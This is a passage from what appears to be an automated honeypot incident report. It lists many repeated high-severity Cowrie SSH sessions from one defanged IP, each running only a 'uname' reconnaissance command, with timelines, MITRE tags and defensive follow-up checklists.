| `2026-07-23 20:51:16` | `cowrie.login.success` |
| `2026-07-23 20:51:16` | `cowrie.session.params` |
| `2026-07-23 20:51:16` | `cowrie.command.input` |
| `2026-07-23 20:51:16` | `cowrie.log.closed` |
| `2026-07-23 20:51:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-38ae7bf5df8b

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-07-23 20:51 |
| **Last Seen** | 2026-07-23 20:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:51:21` | `cowrie.session.connect` |
| `2026-07-23 20:51:21` | `cowrie.client.version` |
| `2026-07-23 20:51:21` | `cowrie.client.kex` |
| `2026-07-23 20:51:21` | `cowrie.login.success` |
| `2026-07-23 20:51:22` | `cowrie.session.params` |
| `2026-07-23 20:51:22` | `cowrie.command.input` |
| `2026-07-23 20:51:22` | `cowrie.log.closed` |
| `2026-07-23 20:51:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db10f699fd48

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-07-23 20:51 |
| **Last Seen** | 2026-07-23 20:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:51:26` | `cowrie.session.connect` |
| `2026-07-23 20:51:26` | `cowrie.client.version` |
| `2026-07-23 20:51:26` | `cowrie.client.kex` |
| `2026-07-23 20:51:27` | `cowrie.login.success` |
| `2026-07-23 20:51:27` | `cowrie.session.params` |
| `2026-07-23 20:51:27` | `cowrie.command.input` |
| `2026-07-23 20:51:28` | `cowrie.log.closed` |
| `2026-07-23 20:51:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-24e5f7bb2bd7

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-07-23 20:51 |
| **Last Seen** | 2026-07-23 20:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:51:32` | `cowrie.session.connect` |
| `2026-07-23 20:51:32` | `cowrie.client.version` |
| `2026-07-23 20:51:32` | `cowrie.client.kex` |
| `2026-07-23 20:51:32` | `cowrie.login.success` |
| `2026-07-23 20:51:33` | `cowrie.session.params` |
| `2026-07-23 20:51:33` | `cowrie.command.input` |
| `2026-07-23 20:51:33` | `cowrie.log.closed` |
| `2026-07-23 20:51:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-22588f3d6f32

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-07-23 20:51 |
| **Last Seen** | 2026-07-23 20:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:51:37` | `cowrie.session.connect` |
| `2026-07-23 20:51:37` | `cowrie.client.version` |
| `2026-07-23 20:51:37` | `cowrie.client.kex` |
| `2026-07-23 20:51:37` | `cowrie.login.success` |
| `2026-07-23 20:51:38` | `cowrie.session.params` |
| `2026-07-23 20:51:38` | `cowrie.command.input` |
| `2026-07-23 20:51:38` | `cowrie.log.closed` |
| `2026-07-23 20:51:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dccda55f8262

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-07-23 20:51 |
| **Last Seen** | 2026-07-23 20:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:51:42` | `cowrie.session.connect` |
| `2026-07-23 20:51:42` | `cowrie.client.version` |
| `2026-07-23 20:51:42` | `cowrie.client.kex` |
| `2026-07-23 20:51:42` | `cowrie.login.success` |
| `2026-07-23 20:51:43` | `cowrie.session.params` |
| `2026-07-23 20:51:43` | `cowrie.command.input` |
| `2026-07-23 20:51:44` | `cowrie.log.closed` |
| `2026-07-23 20:51:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-720a86a16a84

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-07-23 20:51 |
| **Last Seen** | 2026-07-23 20:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:51:48` | `cowrie.session.connect` |
| `2026-07-23 20:51:48` | `cowrie.client.version` |
| `2026-07-23 20:51:48` | `cowrie.client.kex` |
| `2026-07-23 20:51:48` | `cowrie.login.success` |
| `2026-07-23 20:51:49` | `cowrie.session.params` |
| `2026-07-23 20:51:49` | `cowrie.command.input` |
| `2026-07-23 20:51:49` | `cowrie.log.closed` |
| `2026-07-23 20:51:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9fa37e9ac7c5

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-07-23 20:51 |
| **Last Seen** | 2026-07-23 20:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:51:53` | `cowrie.session.connect` |
| `2026-07-23 20:51:53` | `cowrie.client.version` |
| `2026-07-23 20:51:54` | `cowrie.client.kex` |
| `2026-07-23 20:51:54` | `cowrie.login.success` |
| `2026-07-23 20:51:55` | `cowrie.session.params` |
| `2026-07-23 20:51:55` | `cowrie.command.input` |
| `2026-07-23 20:51:55` | `cowrie.log.closed` |
| `2026-07-23 20:51:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-29d8df17f2a4

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-07-23 20:51 |
| **Last Seen** | 2026-07-23 20:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:51:59` | `cowrie.session.connect` |
| `2026-07-23 20:51:59` | `cowrie.client.version` |
| `2026-07-23 20:51:59` | `cowrie.client.kex` |
| `2026-07-23 20:52:00` | `cowrie.login.success` |
| `2026-07-23 20:52:00` | `cowrie.session.params` |
| `2026-07-23 20:52:00` | `cowrie.command.input` |
| `2026-07-23 20:52:01` | `cowrie.log.closed` |
| `2026-07-23 20:52:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7b59f6833f5

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-07-23 20:52 |
| **Last Seen** | 2026-07-23 20:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:52:05` | `cowrie.session.connect` |
| `2026-07-23 20:52:05` | `cowrie.client.version` |
| `2026-07-23 20:52:05` | `cowrie.client.kex` |
| `2026-07-23 20:52:05` | `cowrie.login.success` |
| `2026-07-23 20:52:06` | `cowrie.session.params` |
| `2026-07-23 20:52:06` | `cowrie.command.input` |
| `2026-07-23 20:52:06` | `cowrie.log.closed` |
| `2026-07-23 20:52:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23d0ffbd99b5

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-07-23 20:52 |
| **Last Seen** | 2026-07-23 20:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:52:10` | `cowrie.session.connect` |
| `2026-07-23 20:52:10` | `cowrie.client.version` |
| `2026-07-23 20:52:10` | `cowrie.client.kex` |
| `2026-07-23 20:52:11` | `cowrie.login.success` |
| `2026-07-23 20:52:12` | `cowrie.session.params` |
| `2026-07-23 20:52:12` | `cowrie.command.input` |
| `2026-07-23 20:52:12` | `cowrie.log.closed` |
| `2026-07-23 20:52:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-edbcb9a82a18

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-07-23 20:52 |
| **Last Seen** | 2026-07-23 20:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:52:16` | `cowrie.session.connect` |
| `2026-07-23 20:52:16` | `cowrie.client.version` |
| `2026-07-23 20:52:16` | `cowrie.client.kex` |
| `2026-07-23 20:52:16` | `cowrie.login.success` |
| `2026-07-23 20:52:17` | `cowrie.session.params` |
| `2026-07-23 20:52:17` | `cowrie.command.input` |
| `2026-07-23 20:52:17` | `cowrie.log.closed` |
| `2026-07-23 20:52:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d81e9b3bbb8

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-07-23 20:52 |
| **Last Seen** | 2026-07-23 20:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:52:21` | `cowrie.session.connect` |
| `2026-07-23 20:52:21` | `cowrie.client.version` |
| `2026-07-23 20:52:21` | `cowrie.client.kex` |
| `2026-07-23 20:52:22` | `cowrie.login.success` |
| `2026-07-23 20:52:22` | `cowrie.session.params` |
| `2026-07-23 20:52:22` | `cowrie.command.input` |
| `2026-07-23 20:52:22` | `cowrie.log.closed` |
| `2026-07-23 20:52:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-185abcee6e91

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-07-23 20:52 |
| **Last Seen** | 2026-07-23 20:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:52:27` | `cowrie.session.connect` |
| `2026-07-23 20:52:27` | `cowrie.client.version` |
| `2026-07-23 20:52:27` | `cowrie.client.kex` |
| `2026-07-23 20:52:27` | `cowrie.login.success` |
| `2026-07-23 20:52:28` | `cowrie.session.params` |
| `2026-07-23 20:52:28` | `cowrie.command.input` |
| `2026-07-23 20:52:28` | `cowrie.log.closed` |
| `2026-07-23 20:52:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7cd7bee8abfa

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-07-23 20:52 |
| **Last Seen** | 2026-07-23 20:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:52:32` | `cowrie.session.connect` |
| `2026-07-23 20:52:32` | `cowrie.client.version` |
| `2026-07-23 20:52:32` | `cowrie.client.kex` |
| `2026-07-23 20:52:33` | `cowrie.login.success` |
| `2026-07-23 20:52:33` | `cowrie.session.params` |
| `2026-07-23 20:52:33` | `cowrie.command.input` |
| `2026-07-23 20:52:33` | `cowrie.log.closed` |
| `2026-07-23 20:52:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eb435d2ae721

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-07-23 20:52 |
| **Last Seen** | 2026-07-23 20:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:52:38` | `cowrie.session.connect` |
| `2026-07-23 20:52:38` | `cowrie.client.version` |
| `2026-07-23 20:52:38` | `cowrie.client.kex` |
| `2026-07-23 20:52:38` | `cowrie.login.success` |
| `2026-07-23 20:52:39` | `cowrie.session.params` |
| `2026-07-23 20:52:39` | `cowrie.command.input` |
| `2026-07-23 20:52:39` | `cowrie.log.closed` |
| `2026-07-23 20:52:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-151a5657976e

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-07-23 20:52 |
| **Last Seen** | 2026-07-23 20:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:52:43` | `cowrie.session.connect` |
| `2026-07-23 20:52:43` | `cowrie.client.version` |
| `2026-07-23 20:52:43` | `cowrie.client.kex` |
| `2026-07-23 20:52:44` | `cowrie.login.success` |
| `2026-07-23 20:52:44` | `cowrie.session.params` |
| `2026-07-23 20:52:44` | `cowrie.command.input` |
| `2026-07-23 20:52:45` | `cowrie.log.closed` |
| `2026-07-23 20:52:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c578e09f04fc

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-07-23 20:52 |
| **Last Seen** | 2026-07-23 20:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:52:49` | `cowrie.session.connect` |
| `2026-07-23 20:52:49` | `cowrie.client.version` |
| `2026-07-23 20:52:49` | `cowrie.client.kex` |
| `2026-07-23 20:52:49` | `cowrie.login.success` |
| `2026-07-23 20:52:50` | `cowrie.session.params` |
| `2026-07-23 20:52:50` | `cowrie.command.input` |
| `2026-07-23 20:52:50` | `cowrie.log.closed` |
| `2026-07-23 20:52:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-039231163440

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-07-23 20:52 |
| **Last Seen** | 2026-07-23 20:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:52:54` | `cowrie.session.connect` |
| `2026-07-23 20:52:54` | `cowrie.client.version` |
| `2026-07-23 20:52:54` | `cowrie.client.kex` |
| `2026-07-23 20:52:55` | `cowrie.login.success` |
| `2026-07-23 20:52:55` | `cowrie.session.params` |
| `2026-07-23 20:52:55` | `cowrie.command.input` |
| `2026-07-23 20:52:56` | `cowrie.log.closed` |
| `2026-07-23 20:52:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d6f7fd3c12e

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-07-23 20:52 |
| **Last Seen** | 2026-07-23 20:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:52:59` | `cowrie.session.connect` |
| `2026-07-23 20:52:59` | `cowrie.client.version` |
| `2026-07-23 20:53:00` | `cowrie.client.kex` |
| `2026-07-23 20:53:00` | `cowrie.login.success` |
| `2026-07-23 20:53:01` | `cowrie.session.params` |
| `2026-07-23 20:53:01` | `cowrie.command.input` |
| `2026-07-23 20:53:01` | `cowrie.log.closed` |
| `2026-07-23 20:53:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b6787fa7a32

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-07-23 20:53 |
| **Last Seen** | 2026-07-23 20:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:53:05` | `cowrie.session.connect` |
| `2026-07-23 20:53:05` | `cowrie.client.version` |
| `2026-07-23 20:53:05` | `cowrie.client.kex` |
| `2026-07-23 20:53:05` | `cowrie.login.success` |
| `2026-07-23 20:53:06` | `cowrie.session.params` |
| `2026-07-23 20:53:06` | `cowrie.command.input` |
| `2026-07-23 20:53:06` | `cowrie.log.closed` |
| `2026-07-23 20:53:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ec923912b19

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-07-23 20:53 |
| **Last Seen** | 2026-07-23 20:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:53:10` | `cowrie.session.connect` |
| `2026-07-23 20:53:10` | `cowrie.client.version` |
| `2026-07-23 20:53:10` | `cowrie.client.kex` |
| `2026-07-23 20:53:11` | `cowrie.login.success` |
| `2026-07-23 20:53:12` | `cowrie.session.params` |
| `2026-07-23 20:53:12` | `cowrie.command.input` |
| `2026-07-23 20:53:12` | `cowrie.log.closed` |
| `2026-07-23 20:53:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d643697a4fe

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-07-23 20:53 |
| **Last Seen** | 2026-07-23 20:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:53:15` | `cowrie.session.connect` |
| `2026-07-23 20:53:15` | `cowrie.client.version` |
| `2026-07-23 20:53:15` | `cowrie.client.kex` |
| `2026-07-23 20:53:16` | `cowrie.login.success` |
| `2026-07-23 20:53:17` | `cowrie.session.params` |
| `2026-07-23 20:53:17` | `cowrie.command.input` |
| `2026-07-23 20:53:17` | `cowrie.log.closed` |
| `2026-07-23 20:53:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f057b889e20f

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-07-23 20:53 |
| **Last Seen** | 2026-07-23 20:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:53:21` | `cowrie.session.connect` |
| `2026-07-23 20:53:21` | `cowrie.client.version` |
| `2026-07-23 20:53:21` | `cowrie.client.kex` |
| `2026-07-23 20:53:21` | `cowrie.login.success` |
| `2026-07-23 20:53:22` | `cowrie.session.params` |
| `2026-07-23 20:53:22` | `cowrie.command.input` |
| `2026-07-23 20:53:22` | `cowrie.log.closed` |
| `2026-07-23 20:53:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-083f111e9068

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-07-23 20:53 |
| **Last Seen** | 2026-07-23 20:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:53:26` | `cowrie.session.connect` |
| `2026-07-23 20:53:26` | `cowrie.client.version` |
| `2026-07-23 20:53:26` | `cowrie.client.kex` |
| `2026-07-23 20:53:27` | `cowrie.login.success` |
| `2026-07-23 20:53:27` | `cowrie.session.params` |
| `2026-07-23 20:53:27` | `cowrie.command.input` |
| `2026-07-23 20:53:27` | `cowrie.log.closed` |
| `2026-07-23 20:53:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-15ba9fbce9d6

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-07-23 20:53 |
| **Last Seen** | 2026-07-23 20:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:53:31` | `cowrie.session.connect` |
| `2026-07-23 20:53:31` | `cowrie.client.version` |
| `2026-07-23 20:53:31` | `cowrie.client.kex` |
| `2026-07-23 20:53:32` | `cowrie.login.success` |
| `2026-07-23 20:53:32` | `cowrie.session.params` |
| `2026-07-23 20:53:32` | `cowrie.command.input` |
| `2026-07-23 20:53:32` | `cowrie.log.closed` |
| `2026-07-23 20:53:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-72a41f04cf5f

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-07-23 20:53 |
| **Last Seen** | 2026-07-23 20:53 |
| **Session Duration** | 1s |
